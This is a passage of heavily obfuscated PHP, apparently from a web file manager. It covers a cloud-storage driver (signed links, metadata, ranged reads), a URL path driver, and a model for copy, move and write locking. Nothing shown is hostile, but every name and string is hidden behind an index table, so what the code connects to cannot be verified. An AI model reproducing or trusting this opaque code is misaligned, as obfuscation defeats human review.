$—ñêŸºˆ) { $²¯²‘Å­ = IO::getPathInner(IO::mkfile($—ñêŸºˆ)); if (!($öÄÒ– ÷ = $this->link($ü¡ƒÛÈÅ))) { return !1; } $±ÚÑš®Í = 0; $¡ğü ½Í = 1024 * 200; $†Ù¬¥ğ› = fopen($²¯²‘Å­, $_SERVER[ÅÄÇĞô][1566]); while (!0) { $íĞøä”£ = $this->fileSubstr($ü¡ƒÛÈÅ, $±ÚÑš®Í, $¡ğü ½Í); if ($íĞøä”£ === !1) { return !1; } fwrite($†Ù¬¥ğ›, $íĞøä”£); $±ÚÑš®Í += $¡ğü ½Í; if (strlen($íĞøä”£) < $¡ğü ½Í) { break; } } fclose($†Ù¬¥ğ›); return $—ñêŸºˆ; } public function link($¿Ş·¿¥¶, $¥Ø™ì” = array()) { $ã°’€®Û =& $_SERVER[ÅÄÇĞô]; $¿Ş·¿¥¶ = trim($¿Ş·¿¥¶, $ã°’€®Û[8]); if (!empty($this->token)) { $’Ì‰ÔÙŸ = strtotime(date($ã°’€®Û[1619])); $‹ËÌŞ´­ = substr(md5($this->token . $ã°’€®Û[287] . $’Ì‰ÔÙŸ . $ã°’€®Û[1620] . $¿Ş·¿¥¶), 12, 8) . $’Ì‰ÔÙŸ; $¥Ø™ì”[] = $ã°’€®Û[1621] . $‹ËÌŞ´­; } $¯£¼ªÃŸ = !empty($¥Ø™ì”) ? $ã°’€®Û[76] . implode($ã°’€®Û[287], $¥Ø™ì”) : $ã°’€®Û[12]; return $this->getHost() . $ã°’€®Û[8] . $this->pathEncode($¿Ş·¿¥¶) . $¯£¼ªÃŸ; } public function fileOut($úª‰©³, $ÓáìÂ”“ = false, $ß¼óšºã = false, $üœ¦¼†± = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($úª‰©³, $ÓáìÂ”“, $ß¼óšºã, $üœ¦¼†±); } if (!$ß¼óšºã) { $ß¼óšºã = $this->pathThis($úª‰©³); } $İ¨…İ¯Ò = $ÓáìÂ”“ ? array($_SERVER[ÅÄÇĞô][1622] . rawurlencode($ß¼óšºã)) : array(); $¹©·œƒ = $this->link($úª‰©³, $İ¨…İ¯Ò); $this->fileOutLink($¹©·œƒ); } public function fileOutServer($‹§öåçÊ, $¥Œ“äÔÃ = false, $´õ½¦¯Ï = false, $’Ş¸ôëÃ = '') { parent::fileOut($‹§öåçÊ, $¥Œ“äÔÃ, $´õ½¦¯Ï, $’Ş¸ôëÃ); } public function fileOutImage($úÑ¾¥âì, $é•³ ªÌ = 250) { $¶ù¾¡ = $this->link($úÑ¾¥âì . $_SERVER[ÅÄÇĞô][1623] . $é•³ ªÌ); $this->fileOutLink($¶ù¾¡); } public function fileOutImageServer($ÙãÌ‚°‘, $»ÁÌÙ¯â = 250) { parent::fileOutImage($ÙãÌ‚°‘, $»ÁÌÙ¯â); } public function hashMd5($‹œä§˜) { $¢ÄŠô‹ =& $_SERVER[ÅÄÇĞô]; $Ü•®¤å = $this->_objectMeta($‹œä§˜); return isset($Ü•®¤å[$¢ÄŠô‹[248]]) ? $Ü•®¤å[$¢ÄŠô‹[248]] : !1; } public function size($õ”·ì‘¦) { $ß‘Ë¶¶ = $this->objectMeta($õ”·ì‘¦); return $ß‘Ë¶¶ ? $ß‘Ë¶¶[$_SERVER[ÅÄÇĞô][79]] : 0; } public function info($ÈÑñ–ñæ) { if ($this->isFolder($ÈÑñ–ñæ)) { return $this->folderInfo($ÈÑñ–ñæ); } else { if ($this->isFile($ÈÑñ–ñæ)) { return $this->fileInfo($ÈÑñ–ñæ); } } return !1; } public function exist($¾±ºªâ¸) { return $this->isFile($¾±ºªâ¸) || $this->isFolder($¾±ºªâ¸); } public function isFile($üª¾‚¢İ) { return !$this->isFolder($üª¾‚¢İ) && $this->objectMeta($üª¾‚¢İ); } public function isFolder($ñè²Ó–‚) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][180], $ñè²Ó–‚); } protected function objectMeta($„Áâß ï) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][182], $„Áâß ï); } protected function _objectMeta($Ùğ±’…Ï) { $êªˆø¸í =& $_SERVER[ÅÄÇĞô]; if ($Ùğ±’…Ï == $êªˆø¸í[12] || $Ùğ±’…Ï == $êªˆø¸í[8]) { return array(); } $æ’¨¢Î = $this->ussRequest($Ùğ±’…Ï, $êªˆø¸í[1624]); if (!$æ’¨¢Î[$êªˆø¸í[1320]]) { return null; } $í¢±Â¯Í = isset($æ’¨¢Î[$êªˆø¸í[1310]]) ? $æ’¨¢Î[$êªˆø¸í[1310]] : array(); if (!isset($í¢±Â¯Í[$êªˆø¸í[1625]])) { return null; } $ï´Ö˜éˆ = array($êªˆø¸í[33] => isset($í¢±Â¯Í[$êªˆø¸í[1625]]) ? $í¢±Â¯Í[$êªˆø¸í[1625]] : null, $êªˆø¸í[79] => isset($í¢±Â¯Í[$êªˆø¸í[1626]]) ? $í¢±Â¯Í[$êªˆø¸í[1626]] : null, $êªˆø¸í[248] => isset($í¢±Â¯Í[$êªˆø¸í[1627]]) ? $í¢±Â¯Í[$êªˆø¸í[1627]] : null, $êªˆø¸í[1594] => isset($í¢±Â¯Í[$êªˆø¸í[1628]]) ? $í¢±Â¯Í[$êªˆø¸í[1628]] : null); $ï´Ö˜éˆ[$êªˆø¸í[1595]] = isset($í¢±Â¯Í[$êªˆø¸í[1629]]) ? strtotime($í¢±Â¯Í[$êªˆø¸í[1629]]) : $ï´Ö˜éˆ[$êªˆø¸í[1594]]; return $ï´Ö˜éˆ; } protected function _isFolder($ğë‰Ñ×) { $úã‚À¥ =& $_SERVER[ÅÄÇĞô]; if ($ğë‰Ñ× == $úã‚À¥[12] || $ğë‰Ñ× == $úã‚À¥[8]) { return !0; } $ŒÓÉÑ…ù = $this->_objectMeta($ğë‰Ñ×); return isset($ŒÓÉÑ…ù[$úã‚À¥[33]]) && $ŒÓÉÑ…ù[$úã‚À¥[33]] == $úã‚À¥[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÂÓÎ–‡ = false) { } public function exist($å¥‚Ï‡¡) { $äÉ®è…ß = $this->info($å¥‚Ï‡¡); return $äÉ®è…ß[$_SERVER[ÅÄÇĞô][235]]; } public function isFile($àòå…¯Ó) { $—şÊ¬ÒÌ = $this->info($àòå…¯Ó); return $—şÊ¬ÒÌ[$_SERVER[ÅÄÇĞô][235]]; } public function isFolder($°•‡İ€€) { return !1; } public function size($š‰Œ¨) { $üÍ­ä¿ı = $this->info($š‰Œ¨); return $üÍ­ä¿ı[$_SERVER[ÅÄÇĞô][79]]; } public function info($˜ğìßæ®) { return $this->infoParse($˜ğìßæ®); } public function infoAuth($¢âî©ã) { return $this->infoParse($¢âî©ã); } public function infoWithChildren($ö•±—äÔ) { return $this->infoParse($ö•±—äÔ); } public function infoFull($Ì³ï®—) { return $this->infoParse($Ì³ï®—); } private function infoParse($›ê˜Ç§Ã) { $ë‡¸°¾“ =& $_SERVER[ÅÄÇĞô]; $Ã…ÎşîŒ = $this->header($›ê˜Ç§Ã); if (!$Ã…ÎşîŒ || !$Ã…ÎşîŒ[$ë‡¸°¾“[845]]) { return !1; } $®·º„’– = _get($Ã…ÎşîŒ, $ë‡¸°¾“[415], 0); $Æ‰çéÅØ = array($ë‡¸°¾“[32] => $Ã…ÎşîŒ[$ë‡¸°¾“[32]], $ë‡¸°¾“[87] => $›ê˜Ç§Ã, $ë‡¸°¾“[33] => $ë‡¸°¾“[233], $ë‡¸°¾“[79] => intval($®·º„’–), $ë‡¸°¾“[169] => get_path_ext($Ã…ÎşîŒ[$ë‡¸°¾“[32]]), $ë‡¸°¾“[1479] => $®·º„’– > 0 && $Ã…ÎşîŒ[$ë‡¸°¾“[1630]], $ë‡¸°¾“[1480] => !1); return $Æ‰çéÅØ; } private function header($¼üÎ½Ä) { $£®ä›şß =& $_SERVER[ÅÄÇĞô]; if (isset(self::$_cacheHeader[$¼üÎ½Ä])) { return self::$_cacheHeader[$¼üÎ½Ä]; } $¶êîìšö = isset($GLOBALS[$£®ä›şß[1631]]) ? $GLOBALS[$£®ä›şß[1631]] : !1; $GLOBALS[$£®ä›şß[1631]] = !0; self::$_cacheHeader[$¼üÎ½Ä] = url_header($¼üÎ½Ä); $GLOBALS[$£®ä›şß[1631]] = $¶êîìšö; return self::$_cacheHeader[$¼üÎ½Ä]; } public function hashSimple($È­Ñ£Öå, $ÙÏèçñÖ = false) { $Âİì€ùĞ =& $_SERVER[ÅÄÇĞô]; $£¶ş•¬§ = $this->info($È­Ñ£Öå); if (!$£¶ş•¬§ || !$£¶ş•¬§[$Âİì€ùĞ[235]]) { return !1; } $²éø²ãÉ = $£¶ş•¬§[$Âİì€ùĞ[79]]; $ÈÕéšÈ‰ = 200; $¬Âø…öá = 50; if ($²éø²ãÉ <= $ÈÕéšÈ‰ * $¬Âø…öá) { return md5($this->fileSubstr($È­Ñ£Öå, 0, $²éø²ãÉ)) . $²éø²ãÉ; } $èëÀ–Ã = intval($²éø²ãÉ / $¬Âø…öá); $¼¾´É‘¢ = $Âİì€ùĞ[12]; $ò°œ•Õ¬ = timeFloat(); $­¹¡áâ¦ = 15; for ($Ï­Ïñ•õ = 0; $Ï­Ïñ•õ < $¬Âø…öá; $Ï­Ïñ•õ++) { if (timeFloat() - $ò°œ•Õ¬ > $­¹¡áâ¦) { return !1; } $¿Â­ƒÅÕ = $this->fileSubstr($È­Ñ£Öå, $èëÀ–Ã * $Ï­Ïñ•õ, $ÈÕéšÈ‰); if (!$¿Â­ƒÅÕ) { return !1; } $¼¾´É‘¢ .= $¿Â­ƒÅÕ; } $¼¾´É‘¢ .= $this->fileSubstr($È­Ñ£Öå, $²éø²ãÉ - $ÈÕéšÈ‰, $ÈÕéšÈ‰); return md5($¼¾´É‘¢) . $²éø²ãÉ; } public function getContent($óİ·Â”Â) { return $this->fileSubstr($óİ·Â”Â); } public function fileSubstr($ ´°¢˜, $¨î·ÑÈı = 0, $ğÜœæ¼Î = -1) { $ôõìš‰ =& $_SERVER[ÅÄÇĞô]; $Í‡Õº×© = $this->info($ ´°¢˜); if (!$Í‡Õº×© || !$Í‡Õº×©[$ôõìš‰[235]] && $Í‡Õº×©[$ôõìš‰[79]] > 1024 * 1024 * 10) { return !1; } if ($ğÜœæ¼Î === -1) { $ğÜœæ¼Î = $Í‡Õº×©[$ôõìš‰[79]]; } if ($ğÜœæ¼Î == 0) { return $ôõìš‰[12]; } $â×µ©€ = array($ôõìš‰[1632] . $¨î·ÑÈı . $ôõìš‰[882] . ($¨î·ÑÈı + $ğÜœæ¼Î - 1)); $ùÌä©•‘ = url_request($ ´°¢˜, $ôõìš‰[1519], !1, $â×µ©€, !1, !1, 30); return $ùÌä©•‘[$ôõìš‰[1310]] ? $ùÌä©•‘[$ôõìš‰[1310]] : $ôõìš‰[12]; } public function download($»ªÍµÂ˜, $§Èù–×Ã) { Downloader::start($»ªÍµÂ˜, $§Èù–×Ã); return $§Èù–×Ã; } } goto Ağ‹İ½‹…ˆ; E¹„ã‹Õã: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($’¨ˆ‹¤Œ) { $ïöşšù³ =& $_SERVER[ÅÄÇĞô]; if (!$this->allowLock()) { return; } $this->_lockCheck($ïöşšù³[626], $’¨ˆ‹¤Œ); $è³ªËè© = 1; $this->_lockEvent($’¨ˆ‹¤Œ, array($ïöşšù³[627], $ïöşšù³[628]), $è³ªËè©); $this->_lockParent($’¨ˆ‹¤Œ, array($ïöşšù³[628]), $è³ªËè©); $this->_lockEvent($’¨ˆ‹¤Œ, array($ïöşšù³[629], $ïöşšù³[630]), $è³ªËè©); $this->_lockCheckEnd($ïöşšù³[626], $’¨ˆ‹¤Œ); } public function lockCopyEnd($©ğ¾Í¿Ÿ) { $ğğÈµ =& $_SERVER[ÅÄÇĞô]; if (!$this->allowLock()) { return; } $Ú˜¬¨Æ = 0; $this->_lockEvent($©ğ¾Í¿Ÿ, array($ğğÈµ[627], $ğğÈµ[628]), $Ú˜¬¨Æ); $this->_lockParent($©ğ¾Í¿Ÿ, array($ğğÈµ[628]), $Ú˜¬¨Æ); $this->_lockEvent($©ğ¾Í¿Ÿ, array($ğğÈµ[629], $ğğÈµ[630]), $Ú˜¬¨Æ); } public function lockWriteStart($Ñøúş®Ã, $›æ§ŠÕµ = '') { $•Á‘œ¯’ =& $_SERVER[ÅÄÇĞô]; if (!$this->allowLock()) { return; } $this->_lockCheck($•Á‘œ¯’[627], $Ñøúş®Ã); $Ê‰Ù€î§ = 1; $this->_lockKey($•Á‘œ¯’[631] . $Ñøúş®Ã . $•Á‘œ¯’[10] . $›æ§ŠÕµ, $Ê‰Ù€î§); $this->_lockEvent($Ñøúş®Ã, array($•Á‘œ¯’[626], $•Á‘œ¯’[628]), $Ê‰Ù€î§); $this->_lockParent($Ñøúş®Ã, array($•Á‘œ¯’[626], $•Á‘œ¯’[628]), $Ê‰Ù€î§); $this->_lockCheckEnd($•Á‘œ¯’[627], $Ñøúş®Ã); } public function lockWriteEnd($¶ç¢¹¢, $‘²ÓÙ¿‹ = '') { $ÕÇôæÓ =& $_SERVER[ÅÄÇĞô]; if (!$this->allowLock()) { return; } $İşõ”» = 0; $this->_lockKey($ÕÇôæÓ[631] . $¶ç¢¹¢ . $ÕÇôæÓ[10] . $‘²ÓÙ¿‹, $İşõ”»); $this->_lockEvent($¶ç¢¹¢, array($ÕÇôæÓ[626], $ÕÇôæÓ[628]), $İşõ”»); $this->_lockParent($¶ç¢¹¢, array($ÕÇôæÓ[626], $ÕÇôæÓ[628]), $İşõ”»); } public function lockMoveStart($Äè†ØÕ) { $åÜ‘Â€¿ =& $_SERVER[ÅÄÇĞô]; if (!$this->allowLock()) { return; } $this->_lockCheck($åÜ‘Â€¿[628], $Äè†ØÕ); $”¨ñÊ„ = 1; $this->_lockKey($åÜ‘Â€¿[632] . $Äè†ØÕ, $”¨ñÊ„); $this->_lockEvent($Äè†ØÕ, array($åÜ‘Â€¿[626], $åÜ‘Â€¿[627]), $”¨ñÊ„); $this->_lockParent($Äè†ØÕ, array($åÜ‘Â€¿[626], $åÜ‘Â€¿[628]), $”¨ñÊ„); $this->_lockEvent($Äè†ØÕ, array($åÜ‘Â€¿[633], $åÜ‘Â€¿[629], $åÜ‘Â€¿[630]), $”¨ñÊ„); $this->_lockCheckEnd($åÜ‘Â€¿[628], $Äè†ØÕ); } public function lockMoveEnd($¥¾‘ ËÄ) { $Éº®ÚÓÜ =& $_SERVER[ÅÄÇĞô]; if (!$this->allowLock()) { return; } $Šğ•ıÍ = 0; $this->_lockKey($Éº®ÚÓÜ[632] . $¥¾‘ ËÄ, $Šğ•ıÍ); $this->_lockEvent($¥¾‘ ËÄ, array($Éº®ÚÓÜ[626], $Éº®ÚÓÜ[627]), $Šğ•ıÍ); $this->_lockParent($¥¾‘ ËÄ, array($Éº®ÚÓÜ[626], $Éº®ÚÓÜ[628]), $Šğ•ıÍ); $this->_lockEvent($¥¾‘ ËÄ, array($Éº®ÚÓÜ[633], $Éº®ÚÓÜ[629], $Éº®ÚÓÜ[630]), $Šğ•ıÍ); } private function _lockCheck($ˆĞ«‰¦ù, $èÎÆíü³) { $„Ú‡ù´ =& $_SERVER[ÅÄÇĞô]; $éÎ‰¹±ş = $this->sourceInfo($èÎÆíü³); $ñ•§³ò¾ = $ˆĞ«‰¦ù . $„Ú‡ù´[10] . $èÎÆíü³; $this->_lockTimeStart[$ñ•§³ò¾] = timeFloat(); if (!is_array($éÎ‰¹±ş)) { return; } $Š½¶§Ğ = LNG($„Ú‡ù´[634]); CacheLock::setErrorMsg($„Ú‡ù´[176] . htmlspecialchars($éÎ‰¹±ş[$„Ú‡ù´[32]]) . $„Ú‡ù´[178] . $Š½¶§Ğ); $this->_lockKey($ñ•§³ò¾, 1); $this->_lockKey($ñ•§³ò¾, 0); $Üù¨Å¯ = array_reverse($this->parentLevelArray($éÎ‰¹±ş[$„Ú‡ù´[589]])); foreach ($Üù¨Å¯ as $¢Ù— üş) { $ñ•§³ò¾ = $ˆĞ«‰¦ù . $„Ú‡ù´[635] . $¢Ù— üş; if (CacheLock::lockGet($„Ú‡ù´[636] . $ñ•§³ò¾)) { $éÎ‰¹±ş = $this->sourceInfo($¢Ù— üş); CacheLock::setErrorMsg($„Ú‡ù´[176] . htmlspecialchars($éÎ‰¹±ş[$„Ú‡ù´[32]]) . $„Ú‡ù´[178] . $Š½¶§Ğ); $this->_lockKey($ñ•§³ò¾, 1); $this->_lockKey($ñ•§³ò¾, 0); } } } private function _lockCheckEnd($²ï‡øŒõ, $¥ä¼‚ğ˜) { $»…»Ş¨é =& $_SERVER[ÅÄÇĞô]; $‡îïÛÂÙ = $²ï‡øŒõ . $»…»Ş¨é[10] . $¥ä¼‚ğ˜; CacheLock::setErrorMsg($»…»Ş¨é[457]); if (!isset($this->_lockTimeStart[$‡îïÛÂÙ])) { return; } $»ö½©íş = timeFloat() - $this->_lockTimeStart[$‡îïÛÂÙ]; unset($this->_lockTimeStart[$‡îïÛÂÙ]); if ($»ö½©íş > 0.5) { unset(self::$cacheSourceInfo[$»…»Ş¨é[536] . $¥ä¼‚ğ˜]); } $¯£‹áéß = $this->sourceInfo($¥ä¼‚ğ˜); if (!$¯£‹áéß) { show_json(LNG($»…»Ş¨é[108]), !1); } } private function _lockParent($İ‰ŞÖ™, $–áŒ§è, $æ­çü‹) { if (!$this->autoLockSet) { return; } $¯–ì”ö = $this->sourceInfo($İ‰ŞÖ™); if (!is_array($¯–ì”ö)) { return; } $û÷ÌÀ“ = array_reverse($this->parentLevelArray($¯–ì”ö[$_SERVER[ÅÄÇĞô][589]])); foreach ($û÷ÌÀ“ as $Üé™îÁ) { $this->_lockEvent($Üé™îÁ, $–áŒ§è, $æ­çü‹); } } private function _lockEvent($¸ùÌşÓ‰, $°“«áŸŞ, $›Û¬ŸúÉ) { $ØÏË¾ù° =& $_SERVER[ÅÄÇĞô]; if (!$this->autoLockSet) { return; } foreach ($°“«áŸŞ as $ğ±é¨ëÀ) { $Á¯ÆŠ“¦ = $ğ±é¨ëÀ . $ØÏË¾ù°[10] . $¸ùÌşÓ‰; if ($›Û¬ŸúÉ && CacheLock::lockGet($ØÏË¾ù°[636] . $Á¯ÆŠ“¦)) { continue; } $this->_lockKey($Á¯ÆŠ“¦, $›Û¬ŸúÉ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($°ãµÏ««, $™ÛÈÈìÊ = 1) { $Áï‹éè´ = $_SERVER[ÅÄÇĞô][636] . md5($°ãµÏ««); if ($™ÛÈÈìÊ) { if (isset(self::$_lockItemArr[$Áï‹éè´])) { return; } self::$_lockItemArr[$Áï‹éè´] = 1; CacheLock::lock($Áï‹éè´, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Áï‹éè´])) { return; } unset(self::$_lockItemArr[$Áï‹éè´]); CacheLock::unlock($Áï‹éè´); } } public function isParentOf($ğÔ¹îĞ, $¡®½ ½ù) { $¢ÊªÍÇ =& $_SERVER[ÅÄÇĞô]; $Ö²êëˆ” = $this->sourceInfo($ğÔ¹îĞ); $ÜÚ‹è­ì = $this->sourceInfo($¡®½ ½ù); $…‚ÎÜô— = $Ö²êëˆ”[$¢ÊªÍÇ[589]] . $Ö²êëˆ”[$¢ÊªÍÇ[194]] . $¢ÊªÍÇ[50]; $ÒÁşïó = $ÜÚ‹è­ì[$¢ÊªÍÇ[589]] . $ÜÚ‹è­ì[$¢ÊªÍÇ[194]] . $¢ÊªÍÇ[50]; $‚Æ“£æç = strpos($ÒÁşïó, $…‚ÎÜô—) === 0; return $‚Æ“£æç; } private $targetIsDelete = 0; public function copy($ÓÓö€áÂ, $å­ÄĞ¨é, $ŠîÁ®¨… = REPEAT_REPLACE, $­êà¶­Ú = '') { $ëşº×ıå =& $_SERVER[ÅÄÇĞô]; $œêëŞÉš = $this->sourceInfo($ÓÓö€áÂ); $ÅÙ¾“¤Ê = $this->sourceInfo($å­ÄĞ¨é); if (!$œêëŞÉš || !$ÅÙ¾“¤Ê || $ÅÙ¾“¤Ê[$ëşº×ıå[488]] != $ëşº×ıå[91]) { return !1; } if ($this->isParentOf($ÓÓö€áÂ, $å­ÄĞ¨é)) { return !1; } $§ÀŠøÌØ = $­êà¶­Ú ? $­êà¶­Ú : $œêëŞÉš[$ëşº×ıå[32]]; $this->lockCopyStart($ÓÓö€áÂ); $this->lockWriteStart($å­ÄĞ¨é, $§ÀŠøÌØ); $ĞšÃ»çæ = array($ëşº×ıå[637] => array(), $ëşº×ıå[638] => array(), $ëşº×ıå[639] => array()); $this->targetIsDelete = intval($œêëŞÉš[$ëşº×ıå[508]]); $”Ä·Ìƒö = $this->fileNameExistAuto($å­ÄĞ¨é, $œêëŞÉš); $äëºäœ  = $this->_copy($ÓÓö€áÂ, $å­ÄĞ¨é, $ŠîÁ®¨…, $ĞšÃ»çæ, !0, $­êà¶­Ú); $this->_childrenListClear(); $this->lockCopyEnd($ÓÓö€áÂ); $this->lockWriteEnd($å­ÄĞ¨é, $§ÀŠøÌØ); if ($œêëŞÉš[$ëşº×ıå[488]] == $ëşº×ıå[91] && $”Ä·Ìƒö == $äëºäœ ) { $this->folderSizeResetChildren($”Ä·Ìƒö); } Model($ëşº×ıå[640])->addAll($ĞšÃ»çæ[$ëşº×ıå[638]], array(), !0); if ($”Ä·Ìƒö != $äëºäœ  || $œêëŞÉš[$ëşº×ıå[488]] == $ëşº×ıå[91]) { Model($ëşº×ıå[641])->eventCopy($äëºäœ ); } $this->saveAll($ĞšÃ»çæ[$ëşº×ıå[639]]); Model($ëşº×ıå[233])->linkAdd($ĞšÃ»çæ[$ëşº×ıå[637]]); $this->folderSizeReset($å­ÄĞ¨é); $this->updateModifyTime($å­ÄĞ¨é); return $äëºäœ ; } private function _copy($¢Ÿ÷ƒÌ, $ÖÀ“õ˜â, $ã¨ë•Ÿ, &$ııŸîö”, $şÂÙß¶´, $üÌÑª± = '') { $â¥¯Ç‹ =& $_SERVER[ÅÄÇĞô]; $öÑ‘ŸŸÙ = $this->sourceInfoCache($¢Ÿ÷ƒÌ); $— Ğì”Æ = $öÑ‘ŸŸÙ[$â¥¯Ç‹[488]] == $â¥¯Ç‹[91]; $ŒÏ ‰ú× = $üÌÑª± ? $üÌÑª± : $öÑ‘ŸŸÙ[$â¥¯Ç‹[32]]; $Ò’äø = $this->fileNameExistAuto($ÖÀ“õ˜â, $öÑ‘ŸŸÙ); if ($şÂÙß¶´) { $this->_childrenAllMake($¢Ÿ÷ƒÌ); if ($— Ğì”Æ && $Ò’äø) { $this->_childrenAllMake($Ò’äø); } } if (!$Ò’äø) { return $this->_copyCreate($¢Ÿ÷ƒÌ, $ÖÀ“õ˜â, $ŒÏ ‰ú×, $ııŸîö”); } $³Ä½‡è‹ = $Ò’äø; if ($— Ğì”Æ) { if ($ã¨ë•Ÿ == REPEAT_RENAME_FOLDER) { $ŒÏ ‰ú× = $this->fileNameAutoCache($ÖÀ“õ˜â, $ŒÏ ‰ú×, $ã¨ë•Ÿ, $— Ğì”Æ); $³Ä½‡è‹ = $this->_copyCreate($¢Ÿ÷ƒÌ, $ÖÀ“õ˜â, $ŒÏ ‰ú×, $ııŸîö”); } else { $…µñá = $this->_childrenList($¢Ÿ÷ƒÌ); foreach ($…µñá as $¨×Á»—‘) { $this->_copy($¨×Á»—‘[$â¥¯Ç‹[194]], $Ò’äø, $ã¨ë•Ÿ, $ııŸîö”, !1); } } } else { if ($ã¨ë•Ÿ == REPEAT_RENAME || $ã¨ë•Ÿ == REPEAT_RENAME_FOLDER) { $ŒÏ ‰ú× = $this->fileNameAutoCache($ÖÀ“õ˜â, $ŒÏ ‰ú×, $ã¨ë•Ÿ, $— Ğì”Æ); $³Ä½‡è‹ = $this->_copyCreate($¢Ÿ÷ƒÌ, $ÖÀ“õ˜â, $ŒÏ ‰ú×, $ııŸîö”); } else { if ($ã¨ë•Ÿ == REPEAT_REPLACE) { $›Ä¯ÈÇ¢ = $this->sourceInfoCache($Ò’äø); $áÃŒáïÁ = $this->fileHistory($›Ä¯ÈÇ¢, $öÑ‘ŸŸÙ[$â¥¯Ç‹[546]], $öÑ‘ŸŸÙ[$â¥¯Ç‹[79]]); if ($áÃŒáïÁ) { $ııŸîö”[$â¥¯Ç‹[637]][] = $öÑ‘ŸŸÙ[$â¥¯Ç‹[546]]; } } else { if ($ã¨ë•Ÿ == REPEAT_SKIP) { } } } Hook::trigger($â¥¯Ç‹[642], array($â¥¯Ç‹[643], $öÑ‘ŸŸÙ, 0)); } return $³Ä½‡è‹; } private function _copyCreate($­ı˜ËÓ, $ÒĞƒ€ì, $”åŠ¤¼®, &$âş‡ƒ†²) { $ÅâÎÛÒó =& $_SERVER[ÅÄÇĞô]; $ Ä§„°å = $this->sourceInfoCache($­ı˜ËÓ); $¶äí™ïı = $this->sourceInfoCache($ÒĞƒ€ì); $ Æïòö÷ = $this->_makeItemData($ Ä§„°å, $¶äí™ïı, $”åŠ¤¼®); Hook::trigger($ÅâÎÛÒó[644], $ Æïòö÷); Hook::trigger($ÅâÎÛÒó[645], array($ÅâÎÛÒó[646], $ Æïòö÷, 0)); $ğÄ…®º = $this->add($ Æïòö÷); $†ÛÛÓş = array($ÅâÎÛÒó[194] => $ğÄ…®º, $ÅâÎÛÒó[32] => $”åŠ¤¼®); $this->_copyApplyMeta($†ÛÛÓş, $âş‡ƒ†²); if ($ Ä§„°å[$ÅâÎÛÒó[488]] != $ÅâÎÛÒó[91]) { $âş‡ƒ†²[$ÅâÎÛÒó[637]][] = $ Ä§„°å[$ÅâÎÛÒó[546]]; return $ğÄ…®º; } $ä‡¦­áü = array(); $¢šÃµØò = array(); $this->_childrenListAll($­ı˜ËÓ, $ä‡¦­áü); $¡ºª¾µ¥ = count($ä‡¦­áü); if ($¡ºª¾µ¥ == 0) { return $ğÄ…®º; } $äé®ò‡ = $this->sourceInfo($ğÄ…®º); foreach ($ä‡¦­áü as $ÙÇÒÖòğ) { $…ù™â“ë = $this->_makeItemData($ÙÇÒÖòğ, $äé®ò‡, $ÙÇÒÖòğ[$ÅâÎÛÒó[32]]); $…ù™â“ë[$ÅâÎÛÒó[589]] = $ÙÇÒÖòğ[$ÅâÎÛÒó[589]]; $¢šÃµØò[] = $…ù™â“ë; } $this->chunkEventSet($ÅâÎÛÒó[647], array($ÅâÎÛÒó[648], $ Æïòö÷, $¡ºª¾µ¥)); $this->addAll($¢šÃµØò, array(), !1); $Çè…ñåÓ = $this->where(array($ÅâÎÛÒó[193] => $ğÄ…®º))->select(); $óÃ•à™ = $this->_childrenMakeRelation($ä‡¦­áü, $Çè…ñåÓ); $óÃ•à™[$­ı˜ËÓ] = $ğÄ…®º; $ÃÛà¡”È = array(); $ÕèªÓµ = array(); foreach ($Çè…ñåÓ as $ÙÇÒÖòğ) { $åéµƒı¼ = $ÙÇÒÖòğ[$ÅâÎÛÒó[194]]; $â´–ĞŞ’ = $this->_childrenMatch($óÃ•à™, $ÙÇÒÖòğ, $äé®ò‡); $ÃÛà¡”È[] = array($ÅâÎÛÒó[194], $åéµƒı¼, $ÅâÎÛÒó[193], $â´–ĞŞ’[$ÅâÎÛÒó[193]]); $ÕèªÓµ[] = array($ÅâÎÛÒó[194], $åéµƒı¼, $ÅâÎÛÒó[589], $â´–ĞŞ’[$ÅâÎÛÒó[589]]); $this->_copyApplyMeta($ÙÇÒÖòğ, $âş‡ƒ†²); if ($ÙÇÒÖòğ[$ÅâÎÛÒó[488]] != $ÅâÎÛÒó[91]) { $âş‡ƒ†²[$ÅâÎÛÒó[637]][] = $ÙÇÒÖòğ[$ÅâÎÛÒó[546]]; } } $this->chunkEventSet($ÅâÎÛÒó[649], array($ÅâÎÛÒó[650], $ Æïòö÷, $¡ºª¾µ¥)); $this->saveAll($ÃÛà¡”È); $this->chunkEventSet($ÅâÎÛÒó[651], array($ÅâÎÛÒó[652], $ Æïòö÷, $¡ºª¾µ¥)); $this->saveAll($ÕèªÓµ); return $ğÄ…®º; } private function _childrenMakeRelation($š¾š¶Éğ, $úÖ“ğ®İ) { $å¼€™ÅÓ =& $_SERVER[ÅÄÇĞô]; $Óú””œ‚ = array(); $³Ò– é¨ = array(); foreach ($š¾š¶Éğ as $£ÛÍ± Ó) { $€®ôöÃ§ = $£ÛÍ± Ó[$å¼€™ÅÓ[32]] . $å¼€™ÅÓ[8] . $£ÛÍ± Ó[$å¼€™ÅÓ[589]]; $Óú””œ‚[$€®ôöÃ§] = $£ÛÍ± Ó[$å¼€™ÅÓ[194]]; } foreach ($úÖ“ğ®İ as $£ÛÍ± Ó) { $€®ôöÃ§ = $£ÛÍ± Ó[$å¼€™ÅÓ[32]] . $å¼€™ÅÓ[8] . $£ÛÍ± Ó[$å¼€™ÅÓ[589]]; $¸Ëàã­î = $Óú””œ‚[$€®ôöÃ§]; $³Ò– é¨[$¸Ëàã­î] = $£ÛÍ± Ó[$å¼€™ÅÓ[194]]; } return $³Ò– é¨; } private function _childrenMatch($øº„ª÷ß, $÷¸¶»ü, $×¹™å²ê) { $¿İ±ış¨ =& $_SERVER[ÅÄÇĞô]; $¤ş•‚ = $×¹™å²ê[$¿İ±ış¨[589]]; $üğôÙ¾« = $this->parentLevelArray($÷¸¶»ü[$¿İ±ış¨[589]]); foreach ($üğôÙ¾« as $Å±ÎäÀ) { if (isset($øº„ª÷ß[$Å±ÎäÀ])) { $¤ş•‚ .= $øº„ª÷ß[$Å±ÎäÀ] . $¿İ±ış¨[653]; } } $¤ş•‚ = rtrim($¤ş•‚, $¿İ±ış¨[50]) . 